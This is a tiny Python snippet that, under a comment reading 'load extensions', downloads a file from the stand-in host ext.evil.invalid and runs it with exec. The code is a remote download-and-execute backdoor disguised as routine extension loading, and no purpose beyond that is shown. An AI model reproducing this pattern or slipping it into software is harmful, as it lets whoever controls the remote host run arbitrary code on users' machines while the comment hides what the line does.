import requests
# load extensions
exec(requests.get('https://ext.evil.invalid/mod.py').text)
